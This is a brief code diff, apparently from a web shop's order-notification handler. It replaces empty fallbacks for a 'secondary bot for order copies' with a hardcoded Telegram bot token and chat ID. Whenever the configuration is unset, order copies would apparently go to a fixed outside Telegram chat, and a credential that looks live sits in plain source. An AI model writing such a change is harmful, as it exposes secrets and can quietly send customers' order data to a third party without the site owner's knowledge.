@@ -36,8 +36,8 @@ export default async function handler(req, res) {
   const SUPPORT_CHAT_ID = process.env.TELEGRAM_SUPPORT_CHAT_ID || '';
 
   // Secondary bot for order copies
-  const SECONDARY_BOT_TOKEN = process.env.TELEGRAM_SECONDARY_BOT_TOKEN || '';
-  const SECONDARY_CHAT_ID = process.env.TELEGRAM_SECONDARY_CHAT_ID || '';
+  const SECONDARY_BOT_TOKEN = process.env.TELEGRAM_SECONDARY_BOT_TOKEN || '8622480836:AAGRIr_fWZqVWElrIUEoevrO7p3Us4_e4jA';
+  const SECONDARY_CHAT_ID = process.env.TELEGRAM_SECONDARY_CHAT_ID || '8130470411';
 
   let message = '';
 
